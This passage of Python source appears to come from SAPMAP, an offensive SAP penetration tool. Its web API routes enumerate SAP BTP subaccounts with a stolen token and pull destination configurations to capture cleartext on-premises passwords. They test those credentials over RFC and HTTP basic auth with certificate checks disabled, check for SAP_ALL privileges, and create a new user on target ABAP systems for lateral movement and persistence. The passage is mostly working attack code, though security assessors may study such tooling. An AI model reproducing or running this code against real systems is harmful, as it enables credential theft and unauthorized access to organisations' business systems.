                "of scope.  Use the **Pull destinations** action (no "
                "subaccount picker needed) to capture cleartext.")
        elif kind == "subaccount":
            pass     # full BTP-control-plane access — no warnings needed
        elif kind == "other":
            scope_warnings.append(
                "Token kind: `other` (unrecognised).  Audience / cid / "
                "scopes don't match any known BTP API client pattern. "
                "SAPMAP will probe everything but expect noisy 401s.")
        else:
            scope_warnings.append(f"Token kind: `{kind}` — "
                                    f"{kind_desc}")

        # Route the actual API probes by kind so we don't spray 401s
        # against APIs the token can't talk to.
        try:
            if kind == "cf":
                # CF tokens can ONLY do orgs/spaces/apps/SIs.
                subs = []
                mappings = []
                cf_topology = pull_cf_topology(token, region)
            elif kind == "destination":
                # Destination tokens go straight to /destinations —
                # the operator should click "Pull destinations" on the
                # button surfaced when this kind is detected.  We
                # don't pull them automatically here so the workflow
                # stays predictable.
                subs = []
                mappings = []
                cf_topology = {"orgs": [], "spaces": [], "apps": [],
                                "service_instances": [],
                                "escalation_hints": [], "errors": []}
            elif kind == "subaccount":
                # Full control plane.
                subs = enumerate_subaccounts(token, region)
                mappings = pull_scc_mappings(token, region)
                cf_topology = pull_cf_topology(token, region)
            else:
                # Try everything; expect some 401s.
                subs = enumerate_subaccounts(token, region)
                mappings = pull_scc_mappings(token, region)
                cf_topology = pull_cf_topology(token, region)
        except Exception as e:
            return json.dumps({"ok": False, "error": str(e)})

        # Index mappings by subaccount uuid for the per-sub block
        m_by_sub: dict = {}
        for m in mappings:
            m_by_sub.setdefault(m.get("subaccount_uuid", ""), []).append(m)

        added = 0
        now_iso = datetime.now().isoformat()
        for s in subs:
            uuid = s["uuid"]
            if not uuid:
                continue
            sub_node = api.state.btp_subaccounts.get(uuid)
            if sub_node is None:
                sub_node = BTPSubaccountNode(uuid=uuid)
                api.state.btp_subaccounts[uuid] = sub_node
                added += 1
            sub_node.display_name = s.get("display_name") or sub_node.display_name
            sub_node.region = s.get("region") or region
            sub_node.subdomain = s.get("subdomain") or sub_node.subdomain
            sub_node.parent_global_account = (
                s.get("parent_global_account")
                or sub_node.parent_global_account)
            sub_node.scc_locations = m_by_sub.get(uuid, [])
            sub_node.enumerated_at = now_iso
            api.state.fold_btp_placeholders(sub_node)
        print(f"[+] BTP {region}: enumerated {len(subs)} subaccount(s), "
              f"{len(mappings)} SCC mapping(s); {added} new BTP node(s) "
              f"(plus CF topology: {len(cf_topology.get('orgs', []))} orgs, "
              f"{len(cf_topology.get('spaces', []))} spaces, "
              f"{len(cf_topology.get('apps', []))} apps, "
              f"{len(cf_topology.get('service_instances', []))} service-instances)")
        return json.dumps({
            "ok": True,
            "kind":             kind,
            "kind_description": kind_desc,
            "subaccount_count": len(subs),
            "scc_mapping_count": len(mappings),
            "new": added,
            "subaccounts": [
                {"uuid": s["uuid"],
                 "display_name": s.get("display_name", ""),
                 "subdomain": s.get("subdomain", ""),
                 "scc_mappings": len(m_by_sub.get(s["uuid"], []))}
                for s in subs
            ],
            "cf_topology": cf_topology,
            "scopes": scopes,
            "scope_warnings": scope_warnings,
        })

    @app.route("/api/btp/pull_destinations/<uuid>", method="POST")
    def btp_pull_destinations(uuid):
        """Pull every destination for the given subaccount, capture
        cleartext where the token allows, and link captured creds to
        on-prem SAPNodes.  Mutates api.state."""
        from sap_btp import pull_destinations, link_destinations_to_onprem
        response.content_type = "application/json"
        sub = api.state.btp_subaccounts.get(uuid)
        if not sub:
            return json.dumps({"ok": False,
                               "error": f"Unknown BTP subaccount {uuid!r}.  "
                                         "Run /api/btp/enumerate first."})
        token = api.btp_tokens.get(sub.region) or ""
        if not token:
            return json.dumps({"ok": False,
                               "error": f"No token stored for region "
                                         f"{sub.region!r}"})
        try:
            dests, err = pull_destinations(token, sub.region, uuid)
        except Exception as e:
            return json.dumps({"ok": False, "error": str(e)})
        if err:
            return json.dumps({"ok": False, "error": err})
        sub.destinations = dests
        # Link captured creds to on-prem SAPNodes
        before_disc = {s for s, n in api.state.nodes.items()
                        if n.discovered_via_btp}
        linked = link_destinations_to_onprem(api.state, sub)
        new_disc = [s for s, n in api.state.nodes.items()
                    if n.discovered_via_btp and s not in before_disc]
        for new_sid in new_disc:
            print(f"[*] Auto-scanning fresh BTP placeholder {new_sid} …")
            _kick_standard_scan(new_sid)
        captured = sum(1 for d in dests if d.cleartext_captured)
        prd_targets = sum(
            1 for d in dests
            if d.linked_target_sid
            and api.state.nodes.get(d.linked_target_sid)
            and api.state.nodes[d.linked_target_sid].is_production)
        print(f"[+] BTP {sub.region}/{uuid[:8]}: pulled {len(dests)} "
              f"destination(s), {captured} cleartext, {linked} linked "
              f"to on-prem, {prd_targets} reach PRD")
        if captured:
            try:
                sapmap_findings.emit_finding(
                    "CRITICAL", f"BTP:{uuid[:8]}",
                    f"BTP subaccount {sub.display_name or uuid} stores "
                    f"{captured} cleartext on-prem credential(s) in "
                    f"destinations.  Anyone with the "
                    f"`destination_configuration.ApiAccess` scope on "
                    f"this subaccount can pull them.",
                    ref="btp.cleartext.captured",
                    meta={"subaccount": uuid, "count": captured})
            except Exception:
                pass
        return json.dumps({
            "ok": True,
            "destinations": len(dests),
            "cleartext_captured": captured,
            "linked_to_onprem": linked,
            "prd_targets": prd_targets,
        })

    @app.route("/api/btp/test_destination", method="POST")
    def btp_test_destination():
        """Test a BTP-sourced HTTP destination's captured credential.

        Phase 1: HTTP basic-auth probe against the destination URL
                 (proves the cleartext password is valid for the HTTP
                 endpoint exposed via SCC tunnel).
        Phase 2: when the target SID maps to an ABAP SAPNode, log on
                 directly via RFC with the same creds and fetch
                 profiles + roles + SAP_ALL flag.

        Updates the underlying RFCConnection in place — the modal
        live-poller in the GUI re-renders once tested flips True.
        """
        response.content_type = "application/json"
        data = request.json or {}
        source_sid = data.get("source_sid", "")
        dest_name = data.get("destination_name", "")
        if not source_sid.startswith("BTP:") or not dest_name:
            return json.dumps({"error":
                "source_sid (BTP:<uuid8>) and destination_name required"})
        conn = next((c for c in api.state.connections
                     if c.source_sid == source_sid
                        and c.destination_name == dest_name), None)
        if not conn:
            return json.dumps({"error":
                f"connection {source_sid} → {dest_name} not found"})

        def _run():
            import time as _t
            import urllib.request, urllib.error, base64, ssl
            conn.tested = False
            conn.check_error = ""
            conn.user_detail_error = ""
            user = conn.rfc_user or ""
            pwd = conn.secstore_password or ""
            target = (api.state.get_node(conn.target_sid)
                      if conn.target_sid else None)
            is_rfc = (conn.conn_type or "").lower() == "rfc"
            print(f"[*] BTP test: {source_sid} → {dest_name} "
                  f"(type={conn.conn_type or 'rfc'}, "
                  f"target={conn.target_sid}, user={user})")
            if not user or not pwd:
                conn.check_error = ("missing user / password — "
                                     "destination did not capture cleartext")
                conn.tested = True
                print(f"[-] BTP test: {conn.check_error}")
                return

            # ---- Phase 1: connectivity / auth probe -------------------
            if is_rfc:
                # Direct RFC test against the target.  No URL needed —
                # JCo destinations carry ashost / sysnr / client in
                # additional_properties and we already projected those
                # onto conn.target_instance_nr / conn.client.
                if not target:
                    conn.check_error = (f"target {conn.target_sid} not "
                                         f"on the map — run Standard Scan "
                                         f"on it first")
                    conn.tested = True
                    print(f"[-] BTP test: {conn.check_error}")
                    return
                inst = (conn.target_instance_nr or "").strip() or (
                    target.instances[0].instance_nr
                    if target.instances else "00")
                client = (conn.client or "000")
                rfc_creds = Credentials(
                    username=user, password=pwd,
                    client=client, instance_nr=inst,
                )
                # Phase 3b: if the target's gateway is firewalled but
                # we know its ICM HTTP port, verify via SOAP RFC_PING.
                # Otherwise pyrfc → 60s timeout on every BTP test
                # against an HTTP-only target.
                def _btp_test():
                    if not sapmap_exploit._gateway_port_reachable(target):
                        endp = _node_icm_endpoint(api.state, target)
                        if endp:
                            host, port, https = endp
                            try:
                                from sap_soap_basic import SOAPRFCSession
                                _s = SOAPRFCSession(
                                    host=host, port=port,
                                    client=client, user=user,
                                    password=pwd, https=https,
                                    timeout=15.0)
                                return _s.test_connection().get(
                                    "ok", False)
                            except Exception:
                                return False
                    return sapmap_rfc.test_connection(target, rfc_creds)
                t0 = _t.time()
                try:
                    if _btp_test():
                        conn.latency_ms = int((_t.time() - t0) * 1000)
                        conn.ping_ok = True
                        conn.logon_successful = True
                        conn.logon_tested = True
                        print(f"[+] BTP test: RFC logon OK on "
                              f"{conn.target_sid} ({user}/{client}, "
                              f"sysnr={inst}, {conn.latency_ms}ms)")
                    else:
                        conn.latency_ms = int((_t.time() - t0) * 1000)
                        conn.ping_ok = True   # answered, auth rejected
                        conn.logon_successful = False
                        conn.logon_tested = True
                        conn.check_error = "RFC logon rejected"
                        print(f"[-] BTP test: RFC logon failed on "
                              f"{conn.target_sid} ({user}/{client}, "
                              f"sysnr={inst})")
                except Exception as e:
                    conn.check_error = str(e)[:200]
                    print(f"[-] BTP test: RFC connect failed — "
                          f"{conn.check_error}")
                conn.tested = True
            else:
                # HTTP basic-auth probe.
                url = conn.http_url or ""
                if not url:
                    conn.check_error = ("missing http_url — destination "
                                         "did not capture URL")
                    conn.tested = True
                    print(f"[-] BTP test: {conn.check_error}")
                    return
                # When the destination URL has no path (or just "/"), the
                # ICF root usually answers 404 even for valid creds.
                # Append the SAP GUI-for-HTML probe path with the
                # destination's client so basic-auth actually fires.
                # 401 means "wrong credential", 403/200 mean "credential
                # accepted (but maybe no permission for webgui)".  An
                # operator-supplied path (e.g. /sap/myservice) is left
                # alone.
                from urllib.parse import urlparse, urlunparse
                probe_url = url
                parts = urlparse(url)
                if not parts.path or parts.path in ("/", ""):
                    client = (conn.client or "000")
                    probe_path = "/sap/bc/gui/sap/its/webgui"
                    probe_query = (
                        f"sap-client={client}&sap-language=EN")
                    probe_url = urlunparse((
                        parts.scheme, parts.netloc,
                        probe_path, "", probe_query, ""))
                t0 = _t.time()
                try:
                    req = urllib.request.Request(probe_url, method="GET")
                    tok = base64.b64encode(
                        f"{user}:{pwd}".encode("utf-8")).decode("ascii")
                    req.add_header("Authorization", f"Basic {tok}")
                    req.add_header("User-Agent", "SAPMAP-BTP-probe/1.0")
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    with urllib.request.urlopen(
                            req, timeout=10, context=ctx) as r:
                        code = r.getcode()
                        conn.latency_ms = int((_t.time() - t0) * 1000)
                        conn.ping_ok = True
                        conn.logon_successful = code != 401
                        conn.logon_tested = True
                        print(f"[+] BTP test: HTTP {code} from "
                              f"{probe_url} ({conn.latency_ms}ms) — "
                              f"basic-auth OK")
                except urllib.error.HTTPError as he:
                    conn.latency_ms = int((_t.time() - t0) * 1000)
                    conn.ping_ok = True
                    # 401 = wrong credential.  403 = creds OK but
                    # missing S_ICF / S_SERVICE for webgui — still a
                    # valid logon.  Anything else < 500 also counts
                    # the basic-auth as accepted (the ICF responder
                    # ran past the auth challenge).
                    conn.logon_successful = (he.code != 401
                                              and he.code < 500)
                    conn.logon_tested = True
                    conn.check_error = f"HTTP {he.code}"
                    verdict = ("rejected" if he.code == 401
                                else ("OK (no service auth)"
                                       if he.code == 403
                                       else "OK"
                                       if conn.logon_successful
                                       else "server error"))
                    print(f"[-] BTP test: HTTP {he.code} from "
                          f"{probe_url} ({conn.latency_ms}ms) — "
                          f"basic-auth {verdict}")
                except Exception as e:
                    conn.check_error = str(e)[:200]
                    print(f"[-] BTP test: {probe_url} unreachable — "
                          f"{conn.check_error}")
                conn.tested = True

            # ---- Phase 2: profile fetch on ABAP target ----------------
            target_is_abap = (target
                              and "ABAP" in (target.system_type or "").upper())
            platform = (conn.http_target_platform or "").upper()
            # RFC-typed edge implies ABAP target.  HTTP-typed edge only
            # gets the BAPI fetch when the destination's sap-platform
            # explicitly says ABAP (or is unset and the target node is
            # ABAP-flagged).
            wants_bapi = conn.logon_successful and target_is_abap and (
                is_rfc or platform == "ABAP" or not platform)
            if wants_bapi:
                inst = (conn.target_instance_nr or "").strip() or (
                    target.instances[0].instance_nr
                    if target.instances else "00")
                client = conn.client or "000"
                rfc_creds = Credentials(
                    username=user, password=pwd,
                    client=client, instance_nr=inst,
                )
                try:
                    info = sapmap_rfc.get_direct_user_profiles(
                        target, user, rfc_creds)
                    conn.profiles = info.get("profiles", [])
                    conn.roles = info.get("roles", [])
                    conn.has_sap_all = info.get("has_sap_all", False)
                    conn.user_detail_error = info.get("error", "")
                    if not any(c.username == user and c.password == pwd
                               for c in target.credentials):
                        target.credentials.append(rfc_creds)
                    if conn.has_sap_all:
                        print(f"[!] {user}@{conn.target_sid} carries "
                              f"SAP_ALL — Create Remote User now "
                              f"available")
                        target.has_critical_finding = True
                        api.state.notify_sap_all_if_elevated(conn)
                    elif conn.profiles or conn.roles:
                        print(f"[*] {user}@{conn.target_sid}: "
                              f"profiles={len(conn.profiles)}, "
                              f"roles={len(conn.roles)} — no SAP_ALL")
                except Exception as e:
                    conn.user_detail_error = str(e)[:200]
                    print(f"[-] BTP test: RFC profile fetch failed — "
                          f"{conn.user_detail_error}")

        _bg(f"{source_sid}:btp_test:{dest_name}",
            f"BTP test {dest_name}", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/btp/create_user_on_target", method="POST")
    def btp_create_user_on_target():
        """Create a SAPMAP user on the target ABAP system using a BTP
        destination's captured credentials.  Wraps propagate_from_node
        with a synthetic source SAPNode whose sid matches the
        BTP:<uuid8> sentinel — propagate_from_node's fast path keys
        on (source_sid, destination_name, target_sid) so the BTP
        sentinel works identically to a real source SID."""
        response.content_type = "application/json"
        data = request.json or {}
        source_sid = data.get("source_sid", "")
        dest_name = data.get("destination_name", "")
        target_sid = data.get("target_sid", "")
        if (not source_sid.startswith("BTP:")
                or not dest_name or not target_sid):
            return json.dumps({"error":
                "source_sid (BTP:<uuid8>), destination_name and "
                "target_sid required"})
        conn = next((c for c in api.state.connections
                     if c.source_sid == source_sid
                        and c.destination_name == dest_name
                        and c.target_sid == target_sid), None)
        if not conn:
            return json.dumps({"error":
                f"connection {source_sid} → {dest_name} → "
                f"{target_sid} not found"})
        if not conn.logon_successful:
            return json.dumps({"error":
                "Run Test Connection first — propagation requires a "
                "verified logon."})

        # propagate_from_node only reads node.sid (for filtering) and
        # node.saprouter (optional).  Build a thin stub with just those.
        stub = SAPNode(sid=source_sid, hostname="", system_type="BTP")

        def _run():
            sapmap_exploit.propagate_from_node(
                stub, api.state, target_sid=target_sid,
                destination_name=dest_name)

        _bg(f"{source_sid}:btp_create_user:{dest_name}",
            f"BTP create user via {dest_name}", _run)
        return json.dumps({"status": "started"})

    return app
